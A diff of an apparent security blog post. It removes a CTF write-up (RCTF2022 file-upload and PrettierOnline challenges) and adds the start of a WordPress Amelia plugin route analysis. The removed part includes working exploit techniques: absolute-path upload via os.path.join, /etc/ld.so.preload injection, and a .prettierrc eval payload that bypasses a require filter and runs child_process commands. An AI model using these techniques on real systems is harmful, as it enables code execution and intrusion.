@@ -1,193 +1,247 @@
-### plus
+``` php
+<?php
 
-Next is the enhanced version. The code is similar to the previous one, but the only difference is that the result is not passed to `render_template_string`, so SSTI is not possible.
+$action = $_REQUEST['action'];
 
-At first, I thought that this challenge would be related to how file works. I thought it might be related to how it determines the type (magic/libmagic), and then I would find a way to upload the flag file as input and write my own judgment to slowly leak the file content.
-
-However, my teammate found a vulnerability in this part:
-
-``` py
-filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)
-if os.path.exists(filepath) and ".." in filepath:
-```
-
-Python's behavior is quite interesting. If the second parameter of `os.path.join` starts with `/`, it does not perform a join:
-
-``` py
-os.path.join("/tmp/a/", "b") # /tmp/a/b
-os.path.join("/tmp/a/", "/b") # /b
-```
-
-Therefore, we can upload files to any location without `..`. We just need to write a C program to overwrite `/bin/file`.
-
-### promax
-
-This challenge fixed half of the vulnerability in the previous challenge. It only prevents uploading if the file already exists, so we cannot overwrite it. We can only upload new files.
-
-At this point, we still tried to find a solution based on the previous challenge. We looked for ways to use the existing mechanism. However, another teammate said he had a possible unexpected solution, and we solved it.
-
-The idea is to upload a file to `/etc/ld.so.preload` with the contents of `/tmp/a.so`, and then upload another file to `/tmp/a.so`. At this point, the binary will load the code in the file before execution.
-
-Here are the detailed answers from lavish in DC:
-
-1. `os.path.join(app.config['UPLOAD_FOLDER'], f.filename)` allows for arbitrary file upload when f.filename is an absolute path.
-2. Unlike filechecker_plus, you can't now overwrite existing files such as `/bin/file`, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem
-3. If you strace an execution of `/bin/file`, you will notice that it tries to open (like any other executable) the `/etc/ld.so.preload` file. Have a look with `strace file -b <whatever> |& grep ENOENT` -> `access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)`
-4. `/etc/ld.so.preload` is used to specify a list of shared libraries that are preloaded when any executable is run
-5. At this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a `/etc/ld.so.preload` containing the path to your .so and execute file again so that the flag is returned
-6. Since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that file does a clean exit, otherwise subprocess.check_output will raise an exception.
-
-I haven't actually used strace before, but I found it quite useful. Here's a simple record of how to use it:
-
-1. `strace file -b <whatever> |& grep ENOENT`
-2. `strace file /etc/passwd 2>&1 | grep "No such file or directory"`
-
-You can see which system calls were called and which files were accessed.
-
-Because this solution seems to have little to do with file, we always thought it was unexpected, but in the end we found out that it was actually the expected solution.
-
-Author's writeup: https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022
-
-## PrettierOnline
-
-First of all, I really like this question.
-
-The main code is here:
-
-``` js
-const fs = require('fs')
-const crypto = require('crypto')
-const prettier = require('prettier')
-const { nextTick, exit } = require('process')
-require('./fw')
-
-const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim()
-fs.unlinkSync('./dist/id')
-prettier.resolveConfig(`${__dirname}/.prettierrc`).then(config => {
-  const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config)
-  const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex')
-  fs.writeFileSync(`./dist/${id}`, o, 'utf-8')
-  fs.writeFileSync('./dist/ret.js', ret, 'utf-8')
-  nextTick(() => {
-    throw new Error('No NextTick here!')
-  })
-  exit(0)
-})
-```
-
-Simply put, it loads the configuration file and then runs prettier. The only thing you can control in this question is the configuration file.
-
-Then in `./fw.js`, it patches `require`:
-
-``` js
-const Module = require('module')
-const oldRequire = Module.prototype.require
-Module.prototype.require = function (id) {
-  if (typeof id !== 'string') {
-    throw new Error('Bye')
+if ( is_user_logged_in() ) {
+  // If no action is registered, return a Bad Request response.
+  if ( ! has_action( "wp_ajax_{$action}" ) ) {
+    wp_die( '0', 400 );
   }
-  const isCore = Module.isBuiltin(id)
-  if (isCore) {
-    if (!/fs|path|util|os/.test(id)) {
-      throw new Error('Bye, ' + id)
-    }
-  } else {
-    id = Module._resolveFilename(id, this)
+
+  /**
+   * Fires authenticated Ajax actions for logged-in users.
+   *
+   * The dynamic portion of the hook name, `$action`, refers
+   * to the name of the Ajax action callback being fired.
+   *
+   * @since 2.1.0
+   */
+  do_action( "wp_ajax_{$action}" );
+} else {
+  // If no action is registered, return a Bad Request response.
+  if ( ! has_action( "wp_ajax_nopriv_{$action}" ) ) {
+    wp_die( '0', 400 );
   }
-  return oldRequire.call(oldRequire, id)
+
+  /**
+   * Fires non-authenticated Ajax actions for logged-out users.
+   *
+   * The dynamic portion of the hook name, `$action`, refers
+   * to the name of the Ajax action callback being fired.
+   *
+   * @since 2.8.0
+   */
+  do_action( "wp_ajax_nopriv_{$action}" );
 }
-process.dlopen = () => {}
+
+?>
 ```
 
-Since it's about prettier config, the first step is to look at the official documentation: https://prettier.io/docs/en/configuration.html
+For Amelia, two hooks are registered in `ameliabooking.php`:
 
-At the time, I saw a few points:
-
-1. Supports YAML
-2. There is a Sharing configurations thing, which only puts a string and changes it to require that string
-
-For example, if your `.prettierrc` looks like this:
-
-```
-hello
+``` php
+/** Isolate API calls */
+add_action('wp_ajax_wpamelia_api', array('AmeliaBooking\Plugin', 'wpAmeliaApiCall'));
+add_action('wp_ajax_nopriv_wpamelia_api', array('AmeliaBooking\Plugin', 'wpAmeliaApiCall'));
 ```
 
-When you run prettier, you will get: `Error: Cannot find module 'hello'`
+`nopriv` means that no permission (not logged in) is required to call it, and without it, you need to log in to the WordPress system to call it. Many plugins choose to handle authentication-related logic themselves, so they will redirect both actions to the same place.
 
-But because there are no other files that can be controlled on the server, we didn't realize what we could do, so we continued to study what prettier actually did, and spent some time tracing it with a debugger. We found that even if you throw JSON, it still goes to `yaml.parse` to parse your code (which is a useless discovery).
+The `wpAmeliaApiCall` function registers routes:
 
-Later, after looking around, I realized that there were plugins, so I wrote this configuration file:
-
-```
+``` php
+/**
+ * API Call
+ *
+ * @throws \InvalidArgumentException
+ */
+public static function wpAmeliaApiCall()
 {
-  "plugins": ["abc"]
+    try {
+        /** @var Container $container */
+        $container = require AMELIA_PATH . '/src/Infrastructure/ContainerConfig/container.php';
+
+        $app = new App($container);
+
+        // Initialize all API routes
+        Routes::routes($app);
+
+        $app->run();
+
+        exit();
+    } catch (Exception $e) {
+        echo 'ERROR: ' . $e->getMessage();
+    }
 }
 ```
 
-The error message `Error: Cannot find module 'abc'` appears, indicating that prettier will require the plugin.
+Under `src/Infrastructure/Routes`, there are many folders and files that handle different routes. For example, user-related routes are in `src/Infrastructure/Routes/User/User.php`, and the relevant code excerpt is as follows:
 
-So what do we need to require? At this point, I thought of the only file we could control: `.prettierrc`, which means that if `.prettierrc` is both a configuration file and a JS file, it will work.
+``` php
+/**
+ * Class User
+ *
+ * @package AmeliaBooking\Infrastructure\Routes\User
+ */
+class User
+{
+    /**
+     * @param App $app
+     */
+    public static function routes(App $app)
+    {
+        $app->get('/users/wp-users', GetWPUsersController::class);
+        $app->post('/users/authenticate', LoginCabinetController::class);
+        $app->post('/users/logout', LogoutCabinetController::class);
 
-Fortunately, this is easy in YAML:
+        // Customers
+        $app->get('/users/customers/{id:[0-9]+}', GetCustomerController::class);
+        $app->get('/users/customers', GetCustomersController::class);
+        $app->post('/users/customers', AddCustomerController::class);
+        $app->post('/users/customers/{id:[0-9]+}', UpdateCustomerController::class);
+        $app->post('/users/customers/delete/{id:[0-9]+}', DeleteUserController::class);
+        $app->get('/users/customers/effect/{id:[0-9]+}', GetUserDeleteEffectController::class);
+        $app->post('/users/customers/reauthorize', ReauthorizeController::class);
 
-``` yaml
-plugins:
-  - ".prettierrc"
-abc:
-  - console.log(1)
-```
+        // Providers
+        $app->get('/users/providers/{id:[0-9]+}', GetProviderController::class);
+        $app->get('/users/providers', GetProvidersController::class);
+        $app->post('/users/providers', AddProviderController::class);
+        $app->post('/users/providers/{id:[0-9]+}', UpdateProviderController::class);
+        $app->post('/users/providers/status/{id:[0-9]+}', UpdateProviderStatusController::class);
+        $app->post('/users/providers/delete/{id:[0-9]+}', DeleteUserController::class);
+        $app->get('/users/providers/effect/{id:[0-9]+}', GetUserDeleteEffectController::class);
 
-`plgusin:` is a tag in JS, `-` is a minus sign, so there is no problem at all. At this point, I thought this question was quite interesting, combining the concept of JS+yaml polyglot with real world prettier as an example.
-
-After you can execute the code, you need to see how to bypass the require restriction. I tried `import()` but it didn't work. Later, I thought that since any JS can be executed arbitrarily, I just need to change it randomly, like this:
-
-``` yaml
-plugins:
-  - ".prettierrc"
-abc:
-  - eval("h=RegExp.prototype.test;RegExp.prototype.test=function(v){return v == 'child_process' ? true : h.call(this,v)};f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c){ if(a=='./dist/ret.js'){b=f}; return w.call(fs,a,b,c) }")
-```
-
-Readable version:
-
-``` js
-h = RegExp.prototype.test;
-RegExp.prototype.test = function(v){
- return v == 'child_process' ? true : h.call(this,v)
-};
-
-f = require('child_process').execSync('/readflag').toString();
-
-fs = require('fs');
-w = fs.writeFileSync;
-fs.writeFileSync=function(a,b,c){
-  if(a == './dist/ret.js'){
-    b = f
-  };
-  return w.call(fs,a,b,c)
+        // Current User
+        $app->get('/users/current', GetCurrentUserController::class);
+    }
 }
 ```
 
-First, change `RegExp.test` so that you can require anything, and then change the content to flag when `fs.writeFileSync` is called, and finally you can get the flag.
+So how do we actually call these routes? In `src/Infrastructure/ContainerConfig/request.php`, some transformations are made for the query string of the request:
 
-Author's writeup: https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline
+``` php
+<?php
 
-It turns out that you don't need to bypass require at all, you can just use `module.constructor._load('child_process')`, because require also calls this _load method inside: https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js
+use Slim\Http\Request;
+use Slim\Http\Uri;
 
-``` js
-// Loads a module at the given file path. Returns that module's
-// `exports` property.
-Module.prototype.require = function(id) {
-  validateString(id, 'id');
-  if (id === '') {
-    throw new ERR_INVALID_ARG_VALUE('id', id,
-                                    'must be a non-empty string');
-  }
-  requireDepth++;
-  try {
-    return Module._load(id, this, /* isMain */ false);
-  } finally {
-    requireDepth--;
-  }
+$entries['request'] = function (AmeliaBooking\Infrastructure\Common\Container $c) {
+
+    $curUri = Uri::createFromEnvironment($c->get('environment'));
+    // 附註：AMELIA_ACTION_SLUG = "action=wpamelia_api&call="
+    $newRoute = str_replace(
+        ['XDEBUG_SESSION_START=PHPSTORM&' . AMELIA_ACTION_SLUG, AMELIA_ACTION_SLUG],
+        '',
+        $curUri->getQuery()
+    );
+
+    $newPath = strpos($newRoute, '&') ? substr(
+        $newRoute,
+        0,
+        strpos($newRoute, '&')
+    ) : $newRoute;
+
+    $newQuery = strpos($newRoute, '&') ? substr(
+        $newRoute,
+        strpos($newRoute, '&') + 1
+    ) : '';
+
+   $request = Request::createFromEnvironment($c->get('environment'))
+       ->withUri(
+           $curUri
+               ->withPath($newPath)
+               ->withQuery($newQuery)
+       );
+
+    if (method_exists($request, 'getParam') && $request->getParam('showAmeliaErrors')) {
+        ini_set('display_errors', 1);
+        ini_set('display_startup_errors', 1);
+        error_reporting(E_ALL);
+    }
+
+    return $request;
 };
 ```
+
+Simply put, when your request URL looks like this: `/wordpress/wp-admin/admin-ajax.php?action=wpamelia_api&call=/users/wp-users`, the query string is `action=wpamelia_api&call=/users/wp-users`. The part that matches AMELIA_ACTION_SLUG is replaced with a blank space, and it becomes `/users/wp-users`, which corresponds to the route seen in the file above and is then processed by the Slim PHP framework.
+
+`/users/wp-users` corresponds to `GetWPUsersController::class`. Let's take a look at the code for the controller:
+
+``` php
+<?php
+
+namespace AmeliaBooking\Application\Controller\User;
+
+use AmeliaBooking\Application\Commands\User\GetWPUsersCommand;
+use AmeliaBooking\Application\Controller\Controller;
+use Slim\Http\Request;
+
+/**
+ * Class GetWPUsersController
+ *
+ * @package AmeliaBooking\Application\Controller\User
+ */
+class GetWPUsersController extends Controller
+{
+    /**
+     * Instantiates the Get WP Users command to hand it over to the Command Handler
+     *
+     * @param Request $request
+     * @param         $args
+     *
+     * @return GetWPUsersCommand
+     * @throws \RuntimeException
+     */
+    protected function instantiateCommand(Request $request, $args)
+    {
+        $command = new GetWPUsersCommand($args);
+        $command->setField('id', (int)$request->getQueryParam('id'));
+        $command->setField('role', $request->getQueryParam('role'));
+        $requestBody = $request->getParsedBody();
+        $this->setCommandFields($command, $requestBody);
+
+        return $command;
+    }
+}
+```
+
+Here, the Command Pattern in design patterns is used to wrap each action into a command. Who handles this command? Each controller inherits `AmeliaBooking\Application\Controller\Controller`, so the handling code is inside:
+
+``` php
+/**
+ * @param Request  $request
+ * @param Response $response
+ * @param          $args
+ *
+ * @return Response
+ * @throws \InvalidArgumentException
+ * @throws \RuntimeException
+ */
+public function __invoke(Request $request, Response $response, $args)
+{
+    /** @var Command $command */
+    $command = $this->instantiateCommand($request, $args);
+
+    if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &&
+        (
+            $command instanceof DeleteUserCommand ||
+            $command instanceof DeletePackageCommand ||
+            $command instanceof DeleteCategoryCommand ||
+            $command instanceof DeleteServiceCommand ||
+            $command instanceof DeleteExtraCommand ||
+            $command instanceof DeleteLocationCommand ||
+            $command instanceof DeleteEventCommand ||
+            $command instanceof DeletePaymentCommand ||
+            $command instanceof DeleteCouponCommand ||
+            $command instanceof DeleteCustomFieldCommand ||
+            $command instanceof DeleteAppointmentCommand ||
+            $command instanceof DeleteBookingCommand ||
+            $command instanceof DeleteEventBookingCommand ||
+            $command instanceof DeletePackageCustomerCommand ||
+            $command instanceof DeleteNotificationCommand
+        )
+    ) {
+        return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR);
+    }
